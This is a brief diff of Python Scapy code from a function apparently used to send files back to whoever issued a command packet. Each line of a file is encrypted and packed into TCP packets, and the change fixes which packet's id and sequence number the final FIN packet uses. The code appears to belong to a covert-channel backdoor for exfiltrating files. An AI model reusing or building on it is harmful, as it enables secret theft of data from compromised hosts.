@@ -449,11 +449,11 @@ def getFile(packet):
 				dPacket[TCP].seq = dPacket[TCP].seq + 1
 				dPacket[Raw].load = encrypt(line)
 				send(dPacket, verbose=0)
-		dPacket[IP].id = commandPacket[IP].id + 1
-		dPacket[TCP].seq = commandPacket[TCP].seq + 1
+		dPacket[IP].id = dPacket[IP].id + 1
+		dPacket[TCP].seq = dPacket[TCP].seq + 1
 		dPacket[Raw].load = ""
 		dPacket[TCP].flags="F"
-		send(commandPacket, verbose=0)
+		send(dPacket, verbose=0)
 	elif packet.haslayer(UDP):
 		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
 			      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/\
